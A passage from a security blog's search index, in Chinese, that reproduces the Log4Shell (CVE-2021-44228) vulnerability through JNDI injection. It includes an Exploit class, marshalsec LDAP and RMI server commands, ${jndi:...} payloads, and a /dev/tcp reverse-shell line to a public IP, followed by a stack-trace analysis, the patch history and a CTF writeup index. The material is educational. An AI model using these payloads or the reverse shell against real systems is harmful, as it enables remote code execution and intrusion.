\u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002</p> <p>\u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09</p>"},{"location":"sec/vulns/log4j/#cve-2021-44228_1","title":"CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406","text":"<p>CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002</p> <p>\u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002</p>"},{"location":"sec/vulns/log4j/#log4j_4","title":"log4j \u6f0f\u6d1e\u590d\u73b0","text":"<p>\u4e0b\u9762\u5206\u522b\u901a\u8fc7\u8c03\u7528 LDAP \u548c RMI \u670d\u52a1\u7684\u65b9\u5f0f\u6765\u590d\u73b0\u8fd9\u4e00 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002</p>"},{"location":"sec/vulns/log4j/#ldap_1","title":"LDAP \u5b9e\u73b0","text":"<p>\u8fdb\u884c\u8fd9\u4e00\u6f0f\u6d1e\u7684\u590d\u73b0\u9700\u8981\u4ee5\u4e0b\u4e24\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>\u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u7528\u6765\u91cd\u5b9a\u5411\u63d0\u4f9b\u653b\u51fb\u7c7b<ul> <li>\u9700\u8981\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\u6765\u4e3a\u5176\u63d0\u4f9b\u653b\u51fb\u7c7b</li> </ul> </li> <li>\u4e00\u4e2a\u5305\u542b\u5b58\u5728\u6f0f\u6d1e\u7684 log4j \u7ec4\u4ef6\u7684 Java \u5e94\u7528</li> </ul>"},{"location":"sec/vulns/log4j/#_1","title":"\u653b\u51fb\u7c7b","text":"<p>\u9996\u5148\u662f\u7528\u4e8e\u53d1\u8d77\u653b\u51fb\u7684 Exploit \u7c7b\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>public class Exploit {\n    static {\n        try {\n            String[] cmds = {\"open\", \"/System/Applications/Calculator.app\"};\n            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre> \u4f7f\u7528 javac Exploit.java \u5c06\u8fd9\u4e2a\u7c7b\u7f16\u8bd1\u4e3a .class \u7c7b\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 python -m http.server 8888 \u4e3a\u5f53\u524d\u76ee\u5f55\u5728 8888 \u7aef\u53e3\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u3002\u53ef\u4ee5\u901a\u8fc7 curl -I 127.0.0.1:8888/Exploit.class \u6765\u68c0\u67e5\u662f\u5426\u6b63\u5e38\u90e8\u7f72\uff0c\u80fd\u5426\u83b7\u53d6\u5230\u5f53\u524d Exploit \u7c7b\u6587\u4ef6\u3002</p>"},{"location":"sec/vulns/log4j/#ldap_2","title":"LDAP \u670d\u52a1","text":"<p>\u4f7f\u7528 marshalsec \u63d0\u4f9b\u7684\u5de5\u5177\u6765\u76f4\u63a5\u642d\u5efa LDAP \u670d\u52a1 <pre><code>git clone https://github.com/mbechler/marshalsec.git\ncd marshalsec\nmvn clean package -DskipTests # \u901a\u8fc7 maven \u6784\u5efa\n\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\\n    marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8888/#Exploit\"\n</code></pre> \u8fd9\u4e2a LDAP \u670d\u52a1\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9 8888 \u7aef\u53e3\u4e2d\u7684 Exploit \u7c7b\u6587\u4ef6\u7684\u91cd\u5b9a\u5411\u8bbf\u95ee\uff0c\u7aef\u53e3\u5728\u9ed8\u8ba4\u7684 1389\u3002</p>"},{"location":"sec/vulns/log4j/#log4j_5","title":"log4j \u6f0f\u6d1e\u5e94\u7528","text":"<p>\u7f16\u5199\u4e00\u4e2a\u53ea\u8c03\u7528\u4e86 log4j \u8bb0\u5f55 ${jndi:ldap://127.0.0.1:1389/Exploit} \u7684\u7c7b\uff08\u8fd9\u4e2a payload \u4e00\u822c\u662f\u7531\u7528\u6237\u8f93\u5165\u83b7\u53d6\u7684\uff0c\u4f46\u8fd9\u91cc\u65b9\u4fbf\u590d\u73b0\u76f4\u63a5\u786c\u7f16\u7801\u5230\u6f0f\u6d1e\u5e94\u7528\u4e2d\u4e86\uff0c\u4e8c\u8005\u672c\u8d28\u662f\u4e00\u6837\u7684\uff09\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\n\npublic class log4j {\n    private static final Logger logger = LogManager.getLogger(log4j.class);\n\n    public static void main(String[] args) {\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");\n        logger.error(\"${jndi:ldap://127.0.0.1:1389/Exploit}\");\n    }\n}\n</code></pre> \u6ce8\u610f\u56e0\u4e3a\u662f\u9ad8\u7248\u672c JDK\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5f00\u542f com.sun.jndi.ldap.object.trustURLCodebase \u9009\u9879\u3002</p>"},{"location":"sec/vulns/log4j/#_2","title":"\u590d\u73b0\u653b\u51fb","text":"<p>\u524d\u9762\u5df2\u7ecf\u6b63\u5e38\u5f00\u542f\u4e86 LDAP \u670d\u52a1\uff0c\u6240\u4ee5\u6f0f\u6d1e\u5e94\u7528\u8fd0\u884c\u65f6\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230 Exploit \u7c7b\uff0c\u6267\u884c\u5176\u4e2d\u9759\u6001\u4ee3\u7801\u3002\u56e0\u4e3a\u5176\u4e2d\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\u5e94\u7528\u3002 </p> <p>\u53ef\u4ee5\u770b\u5230 LDAP \u670d\u52a1\u7aef\u8f93\u51fa\u4e86\u4e00\u6761\u53d1\u9001 LDAP \u5f15\u7528\u7684\u8bed\u53e5\uff0c\u8bf4\u660e log4j \u5e94\u7528\u786e\u5b9e\u8fde\u63a5\u4e86 LDAP \u670d\u52a1\u7aef\u5e76\u83b7\u53d6\u4e86 Exploit.class \u7c7b\u6587\u4ef6\u3002\u800c\u4e14\u56e0\u4e3a\u5176\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u770b\u5230\u5f39\u51fa\u4e86\u8ba1\u7b97\u5668\uff0c\u8bf4\u660e\u4e86\u8fd9\u4e2a\u9759\u6001\u4ee3\u7801\u786e\u5b9e\u88ab\u6267\u884c\u4e86\u3002\u8fd9\u4e5f\u5c31\u590d\u73b0\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002</p> <p>\u63a5\u4e0b\u6765\u66f4\u6362\u4e00\u4e0b exec \u6267\u884c\u7684\u547d\u4ee4\uff0c\u6765\u5b9e\u73b0\u53cd\u5f39\u7ec8\u7aef\u3002</p> <p>\u9996\u5148\u5728\u8fdc\u7a0b\u516c\u7f51\u670d\u52a1\u5668\uff08ip \u662f 47.103.43.32\uff09\u901a\u8fc7 nc -lnvvp 7777 \u5728 7777 \u7aef\u53e3\u76d1\u542c\uff0c\u7528\u6765\u6355\u83b7\u53cd\u5f39\u7684\u7ec8\u7aef\u3002\u7136\u540e\u66f4\u6539\u653b\u51fb\u7c7b\u4ee3\u7801\uff1a <pre><code>String[] cmds = {\"/bin/bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/47.103.43.32/7777 0&gt;&amp;1\"};\njava.lang.Runtime.getRuntime().exec(cmds).waitFor();\n</code></pre> \u5373\u901a\u8fc7 /dev/tcp \u8bbe\u5907\u5c06 bash \u7684\u8f93\u5165\u8f93\u51fa\u6d41\u91cd\u5b9a\u5411\u5230\u516c\u7f51\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0 get shell\u3002\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\uff1a </p> <p>\u7531\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u5df2\u7ecf\u8fde\u63a5\u4e0a\u4e86\u5f53\u524d\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u7684 macOS \u4e3b\u673a\u3002</p>"},{"location":"sec/vulns/log4j/#_3","title":"\u8c03\u7528\u6808\u5206\u6790","text":"<p>\u901a\u8fc7\u8c03\u8bd5\u8fd0\u884c log4j \u6f0f\u6d1e\u5e94\u7528\u53ef\u4ee5\u83b7\u53d6\u5230\u6574\u4e2a\u7a0b\u5e8f\u7684\u8c03\u7528\u6808\uff1a <pre><code>&lt;clinit&gt;:11, Exploit\nforName0:-1, Class (java.lang)\nforName:348, Class (java.lang)\nloadClass:91, VersionHelper12 (com.sun.naming.internal)\nloadClass:101, VersionHelper12 (com.sun.naming.internal)\nloadClass:115, VersionHelper12 (com.sun.naming.internal)\ngetObjectFactoryFromReference:163, NamingManager (javax.naming.spi)\ngetObjectInstance:189, DirectoryManager (javax.naming.spi)\nc_lookup:1114, LdapCtx (com.sun.jndi.ldap)\np_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)\nlookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)\nlookup:205, GenericURLContext (com.sun.jndi.toolkit.url)\nlookup:94, ldapURLContext (com.sun.jndi.url.ldap)\nlookup:417, InitialContext (javax.naming)\nlookup:172, JndiManager (org.apache.logging.log4j.core.net)\nlookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)\nlookup:221, Interpolator (org.apache.logging.log4j.core.lookup)\nresolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nsubstitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nsubstitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nreplace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)\nformat:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)\nformat:38, PatternFormatter (org.apache.logging.log4j.core.pattern)\ntoSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)\ntoText:244, PatternLayout (org.apache.logging.log4j.core.layout)\nencode:229, PatternLayout (org.apache.logging.log4j.core.layout)\nencode:59, PatternLayout (org.apache.logging.log4j.core.layout)\ndirectEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\ntryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\nappend:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)\ntryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppender:84, AppenderControl (org.apache.logging.log4j.core.config)\ncallAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)\nprocessLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:481, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:456, LoggerConfig (org.apache.logging.log4j.core.config)\nlog:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)\nlog:161, Logger (org.apache.logging.log4j.core)\ntryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)\nlogMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)\nlogIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)\nerror:740, AbstractLogger (org.apache.logging.log4j.spi)\nmain:11, log4j\n</code></pre> \u53ef\u4ee5\u8f83\u6e05\u6670\u5730\u5206\u6790\u51fa\u6765\u7a0b\u5e8f\u8fdb\u5165\u6267\u884c logger.error\uff0c\u7136\u540e\u5728 log \u4e2d\u9010\u5c42\u8c03\u7528\u6700\u7ec8\u8c03\u7528\u5230 resolveVariable \u5373\u5904\u7406 ${} \u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528\u5230\u4e86 Interpolator \u7684 lookup \u65b9\u6cd5\uff0c\u5176\u4e2d\u5bfb\u627e\u5230\u4e86 JndiLookup \u7c7b\uff0c\u8c03\u7528\u5176 lookup \u65b9\u6cd5\uff0c\u4ece LDAP \u670d\u52a1\u83b7\u53d6\u7c7b\uff0c\u7136\u540e\u4ece\u4e2d getObjectInstance\uff0c\u8fd9\u91cc\u4f1a\u8fdb\u884c loadClass \u64cd\u4f5c\uff0c\u800c\u5176\u4e2d\u8c03\u7528\u4e86 Exploit \u7c7b\u9690\u85cf\u7684 clinit \u65b9\u6cd5\u4e5f\u5c31\u662f\u9759\u6001\u4ee3\u7801\uff0c\u9020\u6210 RCE\u3002</p>"},{"location":"sec/vulns/log4j/#rmi_1","title":"RMI \u5b9e\u73b0","text":"<p>RMI \u7684\u5b9e\u73b0\u7c7b\u4f3c LDAP\uff0cExploit \u7c7b\u540c\u6837\u4f7f\u7528\u8c03\u7528\u8ba1\u7b97\u5668\u7684\u4ee3\u7801\uff0c\u901a\u8fc7 python \u5f00\u542f HTTP \u670d\u52a1\u63d0\u4f9b\u7ed9 RMI\u3002\u7136\u540e\u540c\u6837\u901a\u8fc7 marshalsec \u6765\u642d\u5efa RMI \u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3\u5728 1099\uff09\uff1a <pre><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\\n    marshalsec.jndi.RMIRefServer \"http://127.0.0.1:8888/#Exploit\"\n</code></pre> \u7565\u4fee\u6539\u4e00\u4e0b log4j \u6f0f\u6d1e\u5e94\u7528\uff0c\u4f7f\u4e4b\u8bb0\u5f55 ${jndi:rmi://127.0.0.1:1099/Exploit}\uff1a <pre><code>import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class log4j {\n    private static final Logger logger = LogManager.getLogger(log4j.class);\n\n    public static void main(String[] args) {\n        System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");\n        logger.error(\"${jndi:rmi://127.0.0.1:1099/Exploit}\");\n    }\n}\n</code></pre> \u8fd0\u884c\u53d1\u73b0\u8ba1\u7b97\u5668\u5df2\u88ab\u8c03\u51fa\uff1a </p>"},{"location":"sec/vulns/log4j/#log4j_6","title":"log4j \u6f0f\u6d1e\u4fee\u590d","text":"<p>\u9ad8\u7248\u672c\u7684 JDK \u4e2d\u8bbe\u7f6e\u4e86 com.sun.jndi.xxx.object.trustURLCodebase \u9ed8\u8ba4\u4e3a false\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u4e00\u90e8\u5206 JNDI \u6ce8\u5165\u7684\u53d1\u751f\u3002</p> <p>\u5728 CVE-2021-42288 \u53d1\u5e03\u540e\uff0cApache \u901a\u8fc7 #608 \u8fd9\u4e2a pull request \u6765\u5bf9 LDAP \u8fdb\u884c\u4e86\u9650\u5236\uff0c\u5e76\u53d1\u5e03\u4e86 2.15.0-rc1 \u7248\u672c\u3002\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u5b58\u5728\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u6784\u9020\u51fa\u4f1a\u629b\u51fa\u5f02\u5e38\u7684 payload \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u9a8c\u3002</p> <p>\u968f\u540e Apache \u53c8\u8fdb\u884c\u4e86\u5bf9\u4e8e\u5f02\u5e38 URI \u7684\u5904\u7406\uff0c\u53d1\u5e03\u4e86 2.15.0-rc2 \u7248\u672c\uff0c\u4f46\u8fd9\u4e2a\u7248\u672c\u4ecd\u4f1a\u901a\u8fc7\u8f83\u590d\u6742\u7684\u7ed5\u8fc7\u5b9e\u73b0 RCE\u3002\u56e0\u6b64\u5728 2.16.0-rc1 \u7248\u672c\u4e2d\uff0cMessage Lookups \u88ab\u5f7b\u5e95\u5220\u9664\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u88ab\u89e6\u53d1\u7684\u60c5\u51b5\u5c31\u66f4\u5c11\u4e86\uff0c\u4f46\u5982\u679c\u5f00\u53d1\u8005\u624b\u52a8\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u4ecd\u6709\u53ef\u80fd\u901a\u8fc7\u4e00\u7cfb\u5217\u7ed5\u8fc7\u5b9e\u73b0\u6ce8\u5165\u3002</p> <p>\u4f46\u662f\u5728 2.16.0 \u7248\u672c\u4e2d\u5982\u679c\u6ca1\u6709\u5f00\u542f JNDI \u529f\u80fd\uff0c\u5219\u53cc\u5c42\u5d4c\u5957\u7684 ${${...}} \u4f1a\u5bfc\u81f4\u65e0\u9650\u9012\u5f52\uff0c\u4ece\u800c\u9020\u6210 DoS \u653b\u51fb\uff0c\u8fd9\u4e5f\u5c31\u662f\u540e\u7eed\u7684 CVE-2021-45046 \u8fd9\u4e2a\u6f0f\u6d1e\u3002\u968f\u540e\u5728 2.17.0 \u7248\u672c\u4e2d Apache \u4fee\u590d\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5e76\u4e14\u9650\u5236\u5373\u4f7f\u5f00\u542f\u4e86 JNDI \u529f\u80fd\uff0c\u5176\u4ec5\u652f\u6301 java \u534f\u8bae\u800c\u4e0d\u652f\u6301 ldap\uff0c2.15.0-rc2 \u548c 2.16.0 \u4e2d\u7684\u7ed5\u8fc7\u4e5f\u65e0\u6548\u4e86\u3002\u56e0\u6b64 2.17.0 \u4e5f\u5c31\u6210\u4e3a\u4e86\u53ef\u4ee5\u5b8c\u5168\u9632\u6b62\u8fd9\u4e00\u6f0f\u6d1e\u7684 log4j \u7248\u672c\u4e86\u3002</p>"},{"location":"sec/vulns/log4j/#reference","title":"Reference","text":"<ol> <li>CVE-2021-42288. https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228</li> <li>NVD, CVE-2021-44228 Detail. https://nvd.nist.gov/vuln/detail/CVE-2021-44228</li> <li>Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html</li> <li>\u3010\u6f0f\u6d1e\u901a\u544a\u3011Apache Log4j2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2021-44228/CVE-2021-45046\uff09. https://help.aliyun.com/noticelist/articleid/1060971232.html</li> <li>Free Wortley, et al., Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package. https://www.lunasec.io/docs/blog/log4j-zero-day/</li> <li>tangxiaofeng7, CVE-2021-44228-Apache-Log4j-Rce. https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce</li> <li>mbechler, marshalsec toolchain. https://github.com/mbechler/marshalsec</li> <li>log4j \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u53ca\u4fee\u590d\u65b9\u6848. https://zhuanlan.zhihu.com/p/444140910</li> <li>JNDI \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u53ca\u89e3\u51b3\u65b9\u6848. https://zhuanlan.zhihu.com/p/447220806</li> <li>Java Tutorials, Overview of JNDI. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html</li> <li>Java Tutorials, An Overview of RMI Applications. https://docs.oracle.com/javase/tutorial/rmi/overview.html</li> <li>TutorialsPoint, Java RMI - Introduction. https://www.tutorialspoint.com/java_rmi/java_rmi_introduction.htm</li> <li>Java \u4e2d RMI \u7684\u4f7f\u7528. https://cloud.tencent.com/developer/article/1824106</li> <li>Pickle, \u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\u539f\u7406\u4e0e\u793a\u4f8b. https://www.cnblogs.com/wxisme/p/5296441.html</li> <li>Authing \u8eab\u4efd\u4e91, LDAP \u534f\u8bae\u5165\u95e8\uff08\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09. https://zhuanlan.zhihu.com/p/147768058</li> <li>JNDI \u6ce8\u5165\u539f\u7406\u53ca\u5229\u7528. https://xz.aliyun.com/t/6633#toc-7</li> <li>hldfight, log4j \u5b98\u65b9\u6f0f\u6d1e\u4fee\u590d\u53f2. https://blog.csdn.net/qsort_/article/details/122101423</li> <li>rgoers, Restrict LDAP access via JNDI. https://github.com/apache/logging-log4j2/pull/608</li> <li>LOG4J2-3211 - Remove Messge Lookups. https://github.com/apache/logging-log4j2/pull/623</li> <li>\u4ece\u96f6\u5230\u4e00\u5e26\u4f60\u6df1\u5165 log4j2 Jndi RCE CVE-2021-44228 \u6f0f\u6d1e - 2.15.0 rc1\u7ed5\u8fc7\u8be6\u89e3. https://paper.seebug.org/1789/#0x06-2150-rc1</li> <li>4ra1n, \u6d45\u8c08 Log4j2 \u4e4b 2.15.0 \u7248\u672c RCE. https://xz.aliyun.com/t/10689</li> </ol>"},{"location":"writeups/","title":"Writeups","text":"<p>Abstract</p> <p>\u8fd9\u91cc\u4f1a\u5f52\u6863\u4e00\u4e9b\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u6bd4\u8d5b\u6216\u8005\u89e3\u5bc6\u6e38\u620f\u7684 writeup\u3002</p> <p>\u56e0\u4e3a\u6211\u76ee\u524d\u53ea\u4e3b\u653b misc \u65b9\u5411\uff0c\u6240\u4ee5\u8fd9\u91cc\u57fa\u672c\u90fd\u662f misc \u7684 writeup\uff08\u540e\u7eed\u53ef\u80fd\u4f1a\u52a0\u65b9\u5411\uff1f\uff09</p> <p>\u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u6ca1\u505a\u51fa\u4f46\u662f\u6709\u4ef7\u503c\u7684\u9898\u76ee\u662f\u6839\u636e\u522b\u4eba/\u5b98\u65b9 writeup \u590d\u73b0\u800c\u6765\u7684</p>"},{"location":"writeups/#table-of-contents","title":"Table of Contents","text":"Training          <ul> <li> \ud83d\udd12 AAA School Bus  5971  906  31 mins              \u4e0d\u516c\u5f00 </li> <li> SadServers (DevOps)  3875  719  22 mins              1676889437 </li> <li> Ethernaut  3724  1152  27 mins              1655282709 </li> <li> Security Innovation Smart Contract CTF  2053  852  17 mins              1655282709 </li> </ul> 2023          <ul> <li> TPCTF 2023  2149  398  12 mins              1701066380 </li> <li> SECCON CTF 2023 Quals  812  133  4 mins              1695108124 </li> <li> CISCN 2023 Quals  1034  235  6 mins              1686838390 </li> <li> SECCON CTF 2022 Final  481  53  2 mins              1683733808 </li> <li> XCTF 2022 Final  508  29  2 mins              1683733808 </li> <li> Midnight Sun CTF 2023 Quals  150  20  1 mins              1683733808 </li> <li> AliyunCTF 2023  1662  344  10 mins              1683733808 </li> </ul> 2022          <ul> <li> *CTF 2022  530  280  5 mins              1683733808 </li> <li> RCTF 2022  423  29  2 mins              1683733808 </li> <li> SUSCTF 2022  498  83  3 mins              1669878911 </li> <li> D^3CTF 2022  454  143  3 mins              1669878911 </li> <li> SECCON CTF 2022 Quals  1722  111  7 mins              1668337987 </li> <li> N1CTF 2022  2685  838  19 mins              1667819181 </li> <li> USTC Hackergame 2022  8639  182  31 mins              1667017794 </li> <li> TCTF/0CTF 2022  2521  323  12 mins              1665313644 </li> <li> \u5f3a\u7f51\u676f 2022 Quals  866  12  3 mins              1663694209 </li> <li> VNCTF 2022  1220  230  7 mins              1655282709 </li> <li> TQLCTF 2022  1234  365  9 mins              1655282709 </li> <li> MRCTF 2022  930  424  8 mins              1655282709 </li> </ul> 2021          <ul> <li> \u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b  406  81  2 mins              1669878911 </li> <li> ByteCTF 2021 Final  498  58  2 mins              1669878911 </li> <li> USTC Hackergame 2021  9372  286  35 mins              1655471349 </li> <li> SYSU MSC Puzzle 2021  1955  181  9 mins              1655282709 </li> <li> SCTF 2021  349  112  3 mins              1655282709 </li> </ul>"},{"location":"writeups/%2Actf2022/","title":"*CTF 2022 Writeup","text":"<p> \u7ea6 528 \u4e2a\u5b57  280 \u884c\u4ee3\u7801  13 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>misc \u51e0\u4e4e\u90fd\u662f AI \u7684\u4e00\u573a\u6bd4\u8d5b\uff0c\u9664\u4e86\u6709\u4e00\u9053\u7b80\u5355\u9898\u9644\u4ef6\u51fa\u95ee\u9898\u4e86\u6ca1\u505a\u51fa\u6765\u4ee5\u5916 AK \u4e86</p>"},{"location":"writeups/%2Actf2022/#today","title":"Today","text":"<p>\u6839\u636e\u9898\u76ee\u4e2d\u7684 \u201clove machine learning and data science\u201d \u53bb Kaggle \u627e\u4e00\u627e\uff08\u8d5b\u540e\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528  sherlock-project/sherlock \u641c\u7d22\u7528\u6237\u540d\uff09</p> <p>\u76f4\u63a5\u8bbf\u95ee\u7528\u6237\u540d https://www.kaggle.com/anninefour\uff0c\u6709\u8fd9\u4e2a\u4eba\uff0c\u5e76\u4e14\u6709 twitter \u94fe\u63a5\uff1ahttps://twitter.com/1liujing</p> <p></p> <p>\u5f88\u597d\u627e\uff1a\u4e0a\u6d77\u519c\u592b\u679c\u54c1\u751f\u9c9c\u8d85\u5e02(\u82b1\u5c71\u8def\u5e97)</p> <p>\u62cd\u6444\u8005\u6240\u5728\u4f4d\u7f6e\u662f\u82b1\u5c71\u540d\u82d1\u5317\u95e8</p> <p>\u7ffb webarchive\uff1a</p> <p></p> <p></p> <p>\u4ece google map \u627e\uff0c\u53d1\u73b0\u8bc4\u8bba\u533a\u4f0a\u6d41\u666f\u8bc4\u8bba\u7684 flag\uff1a</p> <p></p> <p>flag: *CTF{aGFwcHlsb2NrZG93bg==}</p> <p>\uff08\u770b\u4e86\u4e09\u4e2a\u5c0f\u65f6\u201c\u82b1\u5c71\u540d\u82d1\u5317\u95e8\u201d\u627e\u4e0d\u51fa\u540d\u5802\uff0c\u539f\u6765\u53ea\u5728\u201c\u82b1\u5c71\u540d\u82d1\u201d\u624d\u80fd\u770b\u5230\u2026\u2026\uff09</p>"},{"location":"writeups/%2Actf2022/#alices-warm-up","title":"Alice\u2019s Warm Up","text":"<p>\u52a0\u8f7d\u6a21\u578b\u9700\u8981\u81ea\u5b9a\u4e49 